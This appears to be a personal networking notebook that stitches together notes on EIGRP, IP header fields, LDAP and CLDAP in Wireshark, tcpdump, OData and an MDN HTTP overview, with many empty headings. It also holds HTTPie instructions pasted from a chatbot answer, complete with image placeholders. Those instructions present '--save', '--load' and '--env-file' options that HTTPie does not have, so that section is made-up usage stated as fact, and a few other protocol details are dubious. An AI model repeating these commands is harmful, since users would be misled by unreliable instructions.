    Overview of Enhanced Internal Gateway Routing Protocol (EIGRP)
    EIGRP Features
    EIGRP Operation
    EIGRP Message Types
    EIGRP Configuration Commands
    EIGRP Troubleshooting commands

Overview of EIGRP

Enhanced Interior Gateway Routing Protocol (EIGRP) or Enhanced IGRP is a Cisco proprietary routing protocol utilizing the Diffusing Update Algorithm (DUAL). The DUAL algorithim was invented by Dr. J.J. Garcia-Luna Aceves of SRI International as an improvement to the IGRP routing protocol. EIGRP was designed to be interoperable with standard IGRP. EIGRP is a hybrid protocol as it incorporates features of a Distance Vector routing protocol and features of a Link State routing protocol. EIGRP is often used in Cisco-based networks running multiple network-layer protocols.

EIGRP can redistribute its routes (and metrics) intoother routing protocols and accepts redistribution from other routing protocols as well.
EIGRP Features

    Hybrid Distance Vector/Link State algorithm
    Supports VLSM (subnets/supernets)
    Integrates seamlessly with IGRP
        Automatic Redistribution of Routes (IGRP <-> EIGRP)
        EIGRP metrics are 256 times the IGRP metric and therefore 'directly translatable'
    Fast convergence
    Performs Partial Updates as needed
    Consumes less bandwidth (no broadcasts, no periodic updates, updates contain only changes)
    Supports multiple network layer protocols
        Appletalk
        Internet Protocol (IP)
        Novell Netware (IPX/SPX)

EIGRP Operation

    Four EIGRP Components
        Neighbor Discovery/Recovery
            Dynamically find other routers running IGRP/EIGRP
            Dynamically forms neighbor relationships
            Discover neighbor state (unreachable or inoperative) - Uses HELLO packets
        Reliable Transport Protocol - Utilizes Reliable Transport Protocol (RTP) for delivery of EIGRP packets.
        DUAL Finite State Machine
        Protocol Dependant Modules
    EIGRP tracks all routes advertised by all neighbors (feasible successor routes)
        Selects best path
        Selects a feasible successor route
            CISCO.COM: A feasible successor is a neighboring router used for packet forwarding that is a least-cost path to a destination that is guaranteed not to be part of a routing loop
        If no feasible successor exists,
            queries are sent out to the network
            Diffusing computation is performed to select another feasible route
            Diffusing computation is not processor intensive (but affects convergence time
    Maintains a copy of each neighbor's route table.
    Sends updates only when changes in the metrics occur
    Sends only the changes
    Sends changes only to neighbors that need the information (no broadcasts)
    Can redistribute routes from RTMP, OSPF, RIP, IPX RIP/SAP, IS-IS, EGP and BGP
    Routing
        Administrative Distance for EIGRP
            Summary Routes [5]
            Internal Routes [90]
            External Routes [170]
        Neighbor Tables
            Neighbors recorded (IP and interface of neighbor)
            One neighbor table for each network protocol
            Neighbors send hold time in HELLO packet
            Hello packet contains hold down time
            If neighbor is not heard from within the hold down time, topology table is changed via DUAL
            Contains RTP information (Sequence Number, transmission list of packets, round trip timers optimize retransmission interval).
        Topology Tables
            Contains all destinations advertised by all neighboring routers
            Each topology table entry contains:
                destination address
                list of neighbors used to reach the destination
                for each neighbor store the advertised metric for each destination
                Best Path = sum of best advertised metric from all neighbors and the link cost to the best neighbo
        Feasible Successors
            Route(s) inserted by EIGRP into the routing table will have the best metric of all the routes in the table.
            Any route to a destination whose metric is less than the current entry or entries in the routing table is a feasible successor.
            When the current route enters the 'active' state, the feasible successor is inserted in the routing table.
            The list of feasible successors may have to be re-evaluated if a neighbor sends a topology change or updates the metric to a destination.
            If a neighbor who is the only feasible successor to a destination goes down, all of the neighbor's routes enter the active state and trigger route recomputation.
        Route States (two states)
            Active - recomputation is being performed
            Passive - no recomputation going on
            If feasible successors are always available, a destination never goes into the active state.
            Recomputation occurs when no feasible successor route exists
            If a neighbor who is the only feasible successor to a destination goes down, all of the neighbor's routes enter the active state and trigger route recomputation.
            Recomputation Process
                Send a query packet to all neighboring routers
                Neighbor sends
                    a reply that it has a feasible successor, or
                    a query packet to indicate it is partcipating in the recomputation
                Routes in the active state cannot have their routing table information changed
                Once all neighbors have replied the topology table entry for the destination returns to the pasive state and the router may then select a feasible successor.
        Route Tagging
            Internal routes come from neighbors with the same (E)IGRP AS number or from directly attached interfaces over which IGRP or EIGRP runs.
            External routes come from other routing protocols or from static routes and are tagged with the following information:
                Router ID of the router that distributed the route
                AS number of the destination
                Configurable administrator tag
                ID of the external protocol
                Metric from the external protocol
                Bit flags for default routing

EIGRP Message Types
Type 	Transmit 	Sent 	Function

Hello
	Multicast 	  	Hello messages are used for neighbor discovery and neighbor recovery. If a hello message is not received within the configured interval, all neighbor entries are removed from the routing table and feasible successor routes re utilized.
  	Unicast 	Reliably 	Hello messages are also used to acknowledge receipt of information. Zero byte acknowledgement (with ACK number)

Updates
	Unicast 	Reliably 	Neighbor discovery
  	Multicast 	Reliably 	Link cost or metric change updates
Queries 	Multicast 	Reliably 	Sent when one or more destinations enter the active state.
Replies 	Unicast 	Reliably 	Sent to originator of a query.
Requests 	Multicast or Unicast 	Unreliably 	Request specific information from neighbors

 
EIGRP Configuration

Basic EIGRP router configuration (Cisco)

router(config)# router eigrp <AS number>

	Enable EIGRP routing and set the Autonomous System number.

router(config-router)# network 192.168.0.0 0.0.255.255

	Configure the directly connected networks that will be advertised.


EIGRP Troubleshooting

show ip eigrp topology

	Shows only feasible successor routes

show ip eigrp topology <network> 

	Shows all entries in the topology table for the given destination network.

show ip eigrp topology all-links 

	Shows all entries in the topology table

show ip eigrp topology [active | pending | zero successors ]
             

	Show destinations that are in the active or pending states or have zero successors.

 

	 
						12.1.1.1.4.2.6 Border Gateway Protocol (BGP)

				12.1.1.1.5 IP Communication

					12.1.1.1.5.1 Datagram Structure / Packet Format / Bit Map
The term 'datagram' or 'packet' is used to describe a chunk of IP data. Each IP datagram contains a specific set of fields in a specific order so that the reader knows how to decode and read the stream of data received. The description of the IP datagram format in this tutorial is suitable for most purposes.

An IP datagram looks something like this:
Version 	IHL 	TOS		Total Length
Identification				Flags 	Fragment Offset
TTL			Protocol 	Header Checksum
Source IP Address
Destination IP Address
Options					Padding

Payload (TCP/UDP/ICMP etc.)

VERSION (4 bits)
    The version field is set to the value '4' in decimal or '0100' in binary. The value indicates the version of IP (4 or 6, there is no version 5).
IHL (4 bits)
    The Internet Header Length (IHL) describes how big the header is in 32-bit words. For instance, the minimum value is 5, as that is the minimum size of an IP header that contains all the correct fields is 160 bits, or 20 bytes. This allows the receiver to know exactly where the payload data begins.
TOS (8 bits)
    Type of service allows the intermediate receiving stations (the routers) to have some notion of the quality of service desired. This allows the network to make adaptations for delay, throughput, or reliability.
TOTAL LENGTH (16 bits)
    This informs the receiver of the datagram where the end of the data in this datagram is. This is the length of the entire datagram in octets, including the header. This is why an IP datagram can be up to 65,535 bytes long, as that is the maximum value of this 16-bit field.
IDENTIFICATION (16 bits)
    Sometimes, a device in the the middle of the network path cannot handle the datagram at the size it was originally transmitted, and must break it into fragments. If an intermediate system needs to break up the datagram, it uses this field to aid in identifying the fragments.
FLAGS (3 bits)
    The flags field contains single-bit flags that indicate whether the datagram is a fragment, whether it is permitted to be fragmented, and whether the datagram is the last fragment, or there are more fragments. The first bit in this field is always zero.
FRAGMENT OFFSET (13 bits)
    When a datagram is fragmented, it is necessary to reassemble the fragments in the correct order. The fragment offset numbers the fragments in such a way that they can be reassembled correctly.
TIME TO LIVE (8 bits)
    This field determines how long a datagram will exist. At each hop along a network path, the datagram is opened and it's time to live field is decremented by one (or more than one in some cases). When the time to live field reaches zero, the datagram is said to have 'expired' and is discarded. This prevents congestion on the network that is created when a datagram cannot be forwarded to it's destination. Most applications set the time to live field to 30 or 32 by default.
PROTOCOL (8 bits)
    This indicates what type of protocol is encapsulated within the IP datagram. Some of the common values seen in this field include:

    Protocol 	Number
    (Decimal)
    ICMP 	1
    IGMP 	2
    TCP 	6
    UDP 	17
HEADER CHECKSUM (16 bits)
    According to RFC 791, the header checksum formula is:"the 16-bit ones compliment of the ones compliment sum of all 16-bit words in the header."
    The checksum allows IP to detect datagrams with corrupted headers and discard them. Since the time to live field changes at each hop, the checksum must be re-calculated at each hop. In some cases, this is replaced with a cyclic redundancy check algorithm.
SOURCE ADDRESS (32 bits)
    This is the IP address of the sender of the IP datagram.
DESTINATION ADDRESS (32 bits)
    This is the IP address of the intended receiver(s) of the datagram. If the host portion of this address is set to all 1's, the datagram is an 'all hosts' broadcast.
OPTIONS & PADDING (variable)
    Various options can be included in the header by a particular vendor's implementation of IP. If options are included, the header must be padded with zeroes to fill in any unused octets so that the header is a multiple of 32 bits, and matches the count of bytes in the Internet Header Length (IHL) field. 
					12.1.1.1.5.2 Unicast vs. Broadcast
Unicast
Unicast packets are sent from host to host. The communication is from a single host to another single host. There is one device transmitting a message destined for one reciever.
Broadcast

Broadcast is when a single device is transmitting a message to all other devices in a given address range. This broadcast could reach all hosts on the subnet, all subnets, or all hosts on all subnets. Broadcast packets have the host (and/or subnet) portion of the address set to all ones. By design, most modern routers will block IP broadcast traffic and restrict it to the local subnet.
Multicast

Multicast is a special protocol for use with IP. Multicast enables a single device to communicate with a specific set of hosts, not defined by any standard IP address and mask combination. This allows for communication that resembles a conference call. Anyone from anywhere can join the conference, and everyone at the conference hears what the speaker has to say. The speaker's message isn't broadcasted everywhere, but only to those in the conference call itself. A special set of addresses is used for multicast communication.
					12.1.1.1.5.3 Multicast

				12.1.1.1.6
			12.1.1.2

		12.1.2
	12.2 IPv6

13. LDAP

	13.1  LDAP query syntax

		13.1.1   My examples

			13.1.1.1    search user
Base DN: CN=Users,DC=canada,DC=north,DC=amer,DC=acs,DC=com
Filter: (cn=yosi_i_test1)

		13.1.2

	13.2

14. tcpdump

	14.1  View traffic

		14.1.1  View LDAP traffic
[root@yizaq-1 ~]# tcpdump -s 0 port 389 or port 636

		14.1.2



	14.2



15. wireshark

	15.1 filters 


		15.1.1 CLDAP Ping


			15.1.1.1 What is it?


CLDAP is most commonly encountered on Microsoft Active Directory networks where clients use it to retrieve server information.

This particular operation is described in MS documentation as an "AD ping" but is perhaps more formally described as a RootDSE query for the Netlogon attribute. The Netlogon attribute value is not DER encoded. The operation is derived from an analogous SMB mailslot operation which is reflected in the encoding.

Windows 2000 Server requires UDP for the RootDSE Netlogon query (aka CLDAP "AD ping") whereas either TCP or UDP can be used with Windows 2003 Server.

The filter used by the RootDSE Netlogon query is (&(DnsDomain=example.com)(Host=XP123)(NtVer=\06\00\00\20)(DomainGuid=\01\02\03...) but the Host and DomainGuid are not required. It seems Wireshark may not display this filter correctly as the BER encoding does not reflect the nested & conditions displayed.

The DomainGuid is supplied in Little-Endian binary despite the fact that the BER encoding is otherwise Big-Endian.

The first 4 bits of the first byte of the NtVer value generates four different replies (\01\00\00\00, \02\00\00\00, \04\00\00\00, \08\00\00\00) but the author of this paragraph has only ever observed a value of \06\00\00\20. The mechanics behind these bits is not known but the structures seem to correspond to Netlogon mailslot operations.

Even though MS uses BER 1+4 byte length fields for non-primitive types, DER encoding works fine with both Windows 2000 Server and Windows 2003 Server.

			15.1.1.2 Filter
cldap

				
			15.1.1.3 example
1077	55.029530	10.120.137.9	10.186.20.36	CLDAP	113	searchRequest(2) "<ROOT>" baseObject 
Filter: (&(DnsDomain=vwg)(NtVer=0x80000006))
Attribute: Netlogon
			15.1.1.4


		15.1.2
	15.2 wireshark mac

	    15.2.1 install
https://stackoverflow.com/questions/26242156/install-wireshark-on-macos-x-via-brew

A1.
brew cask install wireshark
A2. 
The homebrew package wireshark installs the command line util tshark. If you want to enable the GUI, then install wireshark like this:

brew install wireshark --with-qt
If you already have Wireshark installed, do

brew reinstall wireshark --with-qt

	    15.2.2

	15.3
16. Active-Directory

	16.1  CLDAP, LDAP Ping, AD Ping
https://wiki.wireshark.org/MS-CLDAP
CLDAP is most commonly encountered on Microsoft Active Directory networks where clients use it to retrieve server information.

This particular operation is described in MS documentation as an "AD ping" but is perhaps more formally described as a RootDSE query for the Netlogon attribute. The Netlogon attribute value is not DER encoded. The operation is derived from an analogous SMB mailslot operation which is reflected in the encoding.

Windows 2000 Server requires UDP for the RootDSE Netlogon query (aka CLDAP "AD ping") whereas either TCP or UDP can be used with Windows 2003 Server.

The filter used by the RootDSE Netlogon query is (&(DnsDomain=example.com)(Host=XP123)(NtVer=\06\00\00\20)(DomainGuid=\01\02\03...) but the Host and DomainGuid are not required. It seems Wireshark may not display this filter correctly as the BER encoding does not reflect the nested & conditions displayed.

The DomainGuid is supplied in Little-Endian binary despite the fact that the BER encoding is otherwise Big-Endian.

The first 4 bits of the first byte of the NtVer value generates four different replies (\01\00\00\00, \02\00\00\00, \04\00\00\00, \08\00\00\00) but the author of this paragraph has only ever observed a value of \06\00\00\20. The mechanics behind these bits is not known but the structures seem to correspond to Netlogon mailslot operations.

Even though MS uses BER 1+4 byte length fields for non-primitive types, DER encoding works fine with both Windows 2000 Server and Windows 2003 Server.

Specifications

Microsoft now has specifications available in the [MS-ADTS] document (http://msdn.microsoft.com/en-us/library/cc223122%28PROT.10%29.aspx).

		16.1.1   Determine Client Site in wireshark
a. Filter cldap

b. Check searchResEntry (2) "ROOT" 
open attribute netlogon LOGON_SAM_LOGON_RESPONSE_EX
Check client site value 

		16.1.2


	16.2

17.  HTTP Client tools

    17.1  Postman

    Export to curl, python, node code
select code, then language 

    17.2 gemini ## Free Alternatives to Postman

**Here are some excellent free alternatives to Postman for API testing and development:**

### Desktop Applications

* **Insomnia:**
    * Open-source and cross-platform.
    * Offers a clean and intuitive interface.
    * Supports environment variables, collections, and automation.
    * [Image of Insomnia API testing tool]
* **HTTPie:**
    * Command-line tool for interacting with APIs.
    * Provides a simple and human-readable syntax.
    * Great for scripting and automation.
    * [Image of HTTPie command-line tool]

### Browser-Based Tools

* **Hoppscotch:**
    * Lightweight and fast.
    * Supports multiple environments and collections.
    * Cross-platform compatibility.
    * [Image of Hoppscotch API testing tool]

### Code-Based Tools

* **cURL:**
    * Command-line tool for transferring data.
    * Versatile and powerful for API testing.
    * Requires scripting knowledge.
    * [Image of cURL command-line tool]

### Choosing the Right Alternative

The best alternative for you depends on your specific needs and preferences:

* **Insomnia** is a good choice for a user-friendly GUI-based tool with rich features.
* **HTTPie** is ideal for developers who prefer a command-line interface and scripting.
* **Hoppscotch** is a lightweight option for quick testing on different devices.
* **cURL** is suitable for experienced users who need a powerful and flexible tool.

**Additional Considerations:**

* **Collaboration:** Some tools offer better collaboration features than others.
* **Automation:** Consider the tool's ability to integrate with your CI/CD pipeline or other automation tools.
* **Community and Support:** Look for tools with active communities and good documentation.

I recommend trying out a few of these options to find the one that best suits your workflow and preferences.
 
**Would you like to explore any of these options in more detail or do you have specific requirements for your API testing needs?**


    17.3 HTTPie

        17.3.1  Installing and Using HTTPie

### Installation
**HTTPie** is a command-line tool, so you'll need a terminal or command prompt to install and use it. Here's how to install it on different operating systems:

**Linux:**

```bash
sudo apt install httpie  # or use your package manager
```

**macOS:**

```bash
brew install httpie
```

**Windows:**

* **Using Chocolatey:**
  ```bash
  choco install httpie
  ```
* **Manual installation:** Download the appropriate installer from [invalid URL removed] and follow the instructions.

**Verify installation:**

```bash
http --version
```

### Basic Usage

Once installed, you can use `http` to send HTTP requests. Here's a simple example of a GET request to Google:

```bash
http https://www.google.com
```

This will send a GET request to Google and display the response in a human-readable format.

### Key Features

* **Intuitive syntax:** HTTPie uses a human-friendly syntax, making it easy to read and write requests.
* **JSON support:** It handles JSON data gracefully, making it suitable for interacting with REST APIs.
* **HTTP methods:** Supports all HTTP methods (GET, POST, PUT, DELETE, etc.).
* **Headers:** Easily add custom headers to your requests.
* **Authentication:** Supports various authentication methods (basic, digest, OAuth, etc.).
* **Cookies:** Handles cookies automatically.
* **Colorized output:** Provides color-coded output for better readability.

### Advanced Usage

HTTPie offers many advanced features. Here are some examples:

* **Sending data:**
  ```bash
  http POST http://httpbin.org/post data="name=John&age=30"
  ```
* **Using JSON data:**
  ```bash
  http POST http://httpbin.org/post data='{"name": "John", "age": 30}'
  ```
* **Setting headers:**
  ```bash
  http --header "Authorization: Bearer your_token" https://api.example.com
  ```
* **Saving requests and responses:**
  ```bash
  http --save my_request.http https://api.example.com
  ```
* **Environment variables:**
  ```bash
  http --env-file config.env https://api.example.com
  ```

### Additional Tips

* Explore the `http` command-line options for more customization.
* Use `http --help` to see a list of available options.
* Consider using HTTPie with tools like `jq` for JSON processing.

By mastering HTTPie, you can efficiently interact with APIs and troubleshoot HTTP-related issues.
 
**Would you like to explore specific use cases or learn about advanced features of HTTPie?**

        17.3.2 Saving and Reusing Requests in HTTPie

HTTPie provides a convenient way to save and reuse requests using the `--save` and `--load` options.

### Saving a Request

To save a request to a file, use the `--save` option followed by the desired filename:

```bash
http POST https://api.example.com/data \
  --data '{"key": "value"}' \
  --save my_request.http
```

This will create a file named `my_request.http` with the following content:

```
POST https://api.example.com/data
Content-Type: application/json

{"key": "value"}
```

### Reusing a Saved Request

To reuse a saved request, use the `--load` option with the filename:

```bash
http --load my_request.http
```

This will execute the request defined in the `my_request.http` file.

### Additional Tips

* You can use environment variables in your saved requests using the `--env` option.
* You can combine multiple saved requests into a single file for more complex scenarios.
* Consider using version control to manage your saved requests.

By utilizing these features, you can streamline your API testing workflow and improve efficiency.
 
**Would you like to explore other features of HTTPie or have specific use cases in mind?**

        17.3.3
    17.4
18. odata

    18.1  Intro
standard for RESTful APIs. 

Architecture
OData is a protocol for the creation and consumption of RESTful APIs. Thus, as common practices of REST, OData builds on HTTP, AtomPub, and JSON using URIs to address and access data feed resources.

Resource identification
OData uses URIs to identify resources. For every OData service whose service root is abbreviated as http://host/service/, the following fixed resources can be found:

The service document
The service document lists entity sets, functions, and singletons that can be retrieved. Clients can use the service document to navigate the model in a hypermedia-driven fashion.
The service document is available at http://host/service/.

The metadata document
The metadata document describes the types, sets, functions and actions understood by the OData service. Clients can use the metadata document to understand how to query and interact with entities in the service.
The metadata document is available at http://host/service/$metadata.

Dynamic resources
The URIs for the dynamic resources may be computed from the hypermedia information in the service document and metadata document.

Resource operation
OData uses the HTTP verbs to indicate the operations on the resources.
GET: Get the resource (a collection of entities, a single entity, a structural property, a navigation property, a stream, etc.).
POST: Create a new resource.
PUT: Update an existing resource by replacing it with a complete instance.
PATCH: Update an existing resource by replacing part of its properties with a partial instance.
DELETE: Remove the resource.

Resource representation
OData uses different formats for representing data and the data model. In OData protocol version 4.0, JSON format is the standard for representing data, with the Atom format still being in committee specification stage. For representing the data model, the Common Schema Definition Language (CSDL) is used, which defines an XML representation of the entity data model exposed by OData services.
A sample OData JSON data payload[edit]
A collection of products:
{
  "@odata.context": "http://services.odata.org/V4/OData/OData.svc/$metadata#Products",
  "value": [
    {
      "ID": 0,
      "Name": "Meat",
      "Description": "Red Meat",
      "ReleaseDate": "1992-01-01T00:00:00Z",
      "DiscontinuedDate": null,
      "Rating": 14,
      "Price": 2.5
    },
    {
      "ID": 1,
      "Name": "Milk",
      "Description": "Low fat milk",
      "ReleaseDate": "1995-10-01T00:00:00Z",
      "DiscontinuedDate": null,
      "Rating": 3,
      "Price": 3.5
    },
    ...
  ]
}

    18.2 https://www.odata.org/getting-started/understand-odata-in-6-steps/

        18.2.1 step 1, request all resources


req:
GET https://services.odata.org/v4/TripPinServiceRW/People HTTP/1.1
OData-Version: 4.0
OData-MaxVersion: 4.0

node:
var http = require('http');
var serviceRoot = 'https://services.odata.org/v4/TripPinServiceRW/';
getURL(serviceRoot + 'People');
function getURL(url) {
    var body = '';
    http.get(url, function (response) {
        response.on('data', function (chunk) {
            body+=chunk;
        });
        response.on('end', function () {
            console.log(body);
        });
    }).on('error', function(e) {
        console.log('ERROR: ' + e.message);
    });
}

resp:
HTTP/1.1 200 OK
Content-Length: 1007
Content-Type: application/json; odata.metadata=minimal
OData-Version: 4.0
{
'@odata.context': 'https://services.odata.org/V4/(S(a2k31bgwiyejn2j2iiybvq4p))/TripPinServiceRW/$metadata#People',
'@odata.nextLink': 'https://services.odata.org/V4/(S(a2k31bgwiyejn2j2iiybvq4p))/TripPinServiceRW/People?%24skiptoken=8',
'value': [
    {
        '@odata.id': 'https://services.odata.org/V4/(S(a2k31bgwiyejn2j2iiybvq4p))/TripPinServiceRW/People('russellwhyte')',
        '@odata.etag': 'W/'08D1D5BD423E5158'',
        '@odata.editLink': 'https://services.odata.org/V4/(S(a2k31bgwiyejn2j2iiybvq4p))/TripPinServiceRW/People('russellwhyte')',
        'UserName': 'russellwhyte',
        'FirstName': 'Russell',
        'LastName': 'Whyte',
        'Emails': [
            'Russell@example.com',
            'Russell@contoso.com',
            null
        ],
        'AddressInfo': [
            {
'Address': '187 Suffolk Ln.',
'City': {
'CountryRegion': 'United States',
'Name': 'Boise',
'Region': 'ID'
}
            },
            null
        ],
        'Gender': 'Male',
        'Concurrency': 635524031272866200
    },
    {
        '@odata.id': 'https://services.odata.org/V4/(S(a2k31bgwiyejn2j2iiybvq4p))/TripPinServiceRW/People('scottketchum')',
        '@odata.etag': 'W/'08D1D5BD423E5158'',
        '@odata.editLink': 'https://services.odata.org/V4/(S(a2k31bgwiyejn2j2iiybvq4p))/TripPinServiceRW/People('scottketchum')',
        'UserName': 'scottketchum',
        'FirstName': 'Scott',
        'LastName': 'Ketchum',
        'Emails': [
            'Scott@example.com'
        ],
        'AddressInfo': [
            {
'Address': '2817 Milton Dr.',
'City': {
'CountryRegion': 'United States',
'Name': 'Albuquerque',
'Region': 'NM'
}
            }
        ],
        'Gender': 'Male',
        'Concurrency': 635524031272866200
    },
    {
        '@odata.id': 'https://services.odata.org/V4/(S(a2k31bgwiyejn2j2iiybvq4p))/TripPinServiceRW/People('ronaldmundy')',
        '@odata.etag': 'W/'08D1D5BD423E5158'',
        '@odata.editLink': 'https://services.odata.org/V4/(S(a2k31bgwiyejn2j2iiybvq4p))/TripPinServiceRW/People('ronaldmundy')',
        'UserName': 'ronaldmundy',
        'FirstName': 'Ronald',
        'LastName': 'Mundy',
        'Emails': [
            'Ronald@example.com',
            'Ronald@contoso.com'
        ],
        'AddressInfo': [ ],
        'Gender': 'Male',
        'Concurrency': 635524031272866200
    },
    {
        '@odata.id': 'https://services.odata.org/V4/(S(a2k31bgwiyejn2j2iiybvq4p))/TripPinServiceRW/People('javieralfred')',
        '@odata.etag': 'W/'08D1D5BD423E5158'',
        '@odata.editLink': 'https://services.odata.org/V4/(S(a2k31bgwiyejn2j2iiybvq4p))/TripPinServiceRW/People('javieralfred')',
        'UserName': 'javieralfred',
        'FirstName': 'Javier',
        'LastName': 'Alfred',
        'Emails': [
            'Javier@example.com',
            'Javier@contoso.com'
        ],
        'AddressInfo': [
            {
'Address': '89 Jefferson Way Suite 2',
'City': {
'CountryRegion': 'United States',
'Name': 'Portland',
'Region': 'WA'
}
            }
        ],
        'Gender': 'Male',
        'Concurrency': 635524031272866200
    },
    {
        '@odata.id': 'https://services.odata.org/V4/(S(a2k31bgwiyejn2j2iiybvq4p))/TripPinServiceRW/People('willieashmore')',
        '@odata.etag': 'W/'08D1D5BD423E5158'',
        '@odata.editLink': 'https://services.odata.org/V4/(S(a2k31bgwiyejn2j2iiybvq4p))/TripPinServiceRW/People('willieashmore')',
        'UserName': 'willieashmore',
        'FirstName': 'Willie',
        'LastName': 'Ashmore',
        'Emails': [
            'Willie@example.com',
            'Willie@contoso.com'
        ],
        'AddressInfo': [ ],
        'Gender': 'Male',
        'Concurrency': 635524031272866200
    },
    {
        '@odata.id': 'https://services.odata.org/V4/(S(a2k31bgwiyejn2j2iiybvq4p))/TripPinServiceRW/People('vincentcalabrese')',
        '@odata.etag': 'W/'08D1D5BD423E5158'',
        '@odata.editLink': 'https://services.odata.org/V4/(S(a2k31bgwiyejn2j2iiybvq4p))/TripPinServiceRW/People('vincentcalabrese')',
        'UserName': 'vincentcalabrese',
        'FirstName': 'Vincent',
        'LastName': 'Calabrese',
        'Emails': [
            'Vincent@example.com',
            'Vincent@contoso.com'
        ],
        'AddressInfo': [
            {
'Address': '55 Grizzly Peak Rd.',
'City': {
'CountryRegion': 'United States',
'Name': 'Butte',
'Region': 'MT'
}
            }
        ],
        'Gender': 'Male',
        'Concurrency': 635524031272866200
    },
    {
        '@odata.id': 'https://services.odata.org/V4/(S(a2k31bgwiyejn2j2iiybvq4p))/TripPinServiceRW/People('clydeguess')',
        '@odata.etag': 'W/'08D1D5BD423E5158'',
        '@odata.editLink': 'https://services.odata.org/V4/(S(a2k31bgwiyejn2j2iiybvq4p))/TripPinServiceRW/People('clydeguess')',
        'UserName': 'clydeguess',
        'FirstName': 'Clyde',
        'LastName': 'Guess',
        'Emails': [
            'Clyde@example.com'
        ],
        'AddressInfo': [ ],
        'Gender': 'Male',
        'Concurrency': 635524031272866200
    },
    {
        '@odata.id': 'https://services.odata.org/V4/(S(a2k31bgwiyejn2j2iiybvq4p))/TripPinServiceRW/People('keithpinckney')',
        '@odata.etag': 'W/'08D1D5BD423E5158'',
        '@odata.editLink': 'https://services.odata.org/V4/(S(a2k31bgwiyejn2j2iiybvq4p))/TripPinServiceRW/People('keithpinckney')',
        'UserName': 'keithpinckney',
        'FirstName': 'Keith',
        'LastName': 'Pinckney',
        'Emails': [
            'Keith@example.com',
            'Keith@contoso.com'
        ],
        'AddressInfo': [ ],
        'Gender': 'Male',
        'Concurrency': 635524031272866200
    }
]
}

        18.2.2 step 2 , Requesting an individual resource
req:
GET https://services.odata.org/v4/TripPinServiceRW/People('russellwhyte') HTTP/1.1
OData-Version: 4.0
OData-MaxVersion: 4.0

node:

resp:

        18.2.3 step 3
    18.3


19. HTTP tags: http

    19.1 HTTP Protocol

        19.1.1 https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview

            19.1.1.1 Introduction


HTTP is a protocol for fetching resources such as HTML documents. It is the foundation of any data exchange on the Web and it is a client-server protocol, which means requests are initiated by the recipient, usually the Web browser. A complete document is reconstructed from the different sub-documents fetched, for instance, text, layout description, images, videos, scripts, and more.

Clients and servers communicate by exchanging individual messages (as opposed to a stream of data). The messages sent by the client, usually a Web browser, are called requests and the messages sent by the server as an answer are called responses.

   Designed in the early 1990s, HTTP is an extensible protocol which has evolved over time. It is an application layer protocol that is sent over TCP, or over a TLS-encrypted TCP connection, though any reliable transport protocol could theoretically be used. Due to its extensibility, it is used to not only fetch hypertext documents, but also images and videos or to post content to servers, like with HTML form results. HTTP can also be used to fetch parts of documents to update Web pages on demand. 


HTTP is a client-server protocol: requests are sent by one entity, the user-agent (or a proxy on behalf of it). Most of the time the user-agent is a Web browser, but it can be anything, for example, a robot that crawls the Web to populate and maintain a search engine index.

Each individual request is sent to a server, which handles it and provides an answer called the response. Between the client and the server there are numerous entities, collectively called proxies, which perform different operations and act as gateways or caches, for example.

            19.1.1.2 Client server chain
In reality, there are more computers between a browser and the server handling the request: there are routers, modems, and more. Thanks to the layered design of the Web, these are hidden in the network and transport layers. HTTP is on top, at the application layer. Although important for diagnosing network problems, the underlying layers are mostly irrelevant to the description of HTTP.

            19.1.1.3 Client: the user-agent
The user-agent is any tool that acts on behalf of the user. This role is primarily performed by the Web browser, but it may also be performed by programs used by engineers and Web developers to debug their applications.

The browser is always the entity initiating the request. It is never the server (though some mechanisms have been added over the years to simulate server-initiated messages).

To display a Web page, the browser sends an original request to fetch the HTML document that represents the page. It then parses this file, making additional requests corresponding to execution scripts, layout information (CSS) to display, and sub-resources contained within the page (usually images and videos). The Web browser then combines these resources to present the complete document, the Web page. Scripts executed by the browser can fetch more resources in later phases and the browser updates the Web page accordingly.

A Web page is a hypertext document. This means some parts of the displayed content are links, which can be activated (usually by a click of the mouse) to fetch a new Web page, allowing the user to direct their user-agent and navigate through the Web. The browser translates these directions into HTTP requests, and further interprets the HTTP responses to present the user with a clear response.

            19.1.1.4 The Web server
On the opposite side of the communication channel is the server, which serves the document as requested by the client. A server appears as only a single machine virtually; but it may actually be a collection of servers sharing the load (load balancing), or a complex piece of software interrogating other computers (like cache, a DB server, or e-commerce servers), totally or partially generating the document on demand.

A server is not necessarily a single machine, but several server software instances can be hosted on the same machine. With HTTP/1.1 and the Host header, they may even share the same IP address.

            19.1.1.5 Proxies
Between the Web browser and the server, numerous computers and machines relay the HTTP messages. Due to the layered structure of the Web stack, most of these operate at the transport, network or physical levels, becoming transparent at the HTTP layer and potentially having a significant impact on performance. Those operating at the application layers are generally called proxies. These can be transparent, forwarding on the requests they receive without altering them in any way, or non-transparent, in which case they will change the request in some way before passing it along to the server. Proxies may perform numerous functions:

caching (the cache can be public or private, like the browser cache)
filtering (like an antivirus scan or parental controls)
load balancing (to allow multiple servers to serve different requests)
authentication (to control access to different resources)
logging (allowing the storage of historical information)

            19.1.1.6 Basic aspects of HTTP

                19.1.1.6.1 HTTP is simple
HTTP is generally designed to be simple and human readable, even with the added complexity introduced in HTTP/2 by encapsulating HTTP messages into frames. HTTP messages can be read and understood by humans, providing easier testing for developers, and reduced complexity for newcomers.

                19.1.1.6.2 HTTP is extensible
Introduced in HTTP/1.0, HTTP headers make this protocol easy to extend and experiment with. New functionality can even be introduced by a simple agreement between a client and a server about a new header's semantics.

                19.1.1.6.3 HTTP is stateless, but not sessionless
HTTP is stateless: there is no link between two requests being successively carried out on the same connection. This immediately has the prospect of being problematic for users attempting to interact with certain pages coherently, for example, using e-commerce shopping baskets. But while the core of HTTP itself is stateless, HTTP cookies allow the use of stateful sessions. Using header extensibility, HTTP Cookies are added to the workflow, allowing session creation on each HTTP request to share the same context, or the same state.

                19.1.1.6.4 HTTP and connections
A connection is controlled at the transport layer, and therefore fundamentally out of scope for HTTP. HTTP doesn't require the underlying transport protocol to be connection-based; it only requires it to be reliable, or not lose messages (at minimum, presenting an error in such cases). Among the two most common transport protocols on the Internet, TCP is reliable and UDP isn't. HTTP therefore relies on the TCP standard, which is connection-based.

Before a client and server can exchange an HTTP request/response pair, they must establish a TCP connection, a process which requires several round-trips. The default behavior of HTTP/1.0 is to open a separate TCP connection for each HTTP request/response pair. This is less efficient than sharing a single TCP connection when multiple requests are sent in close succession.

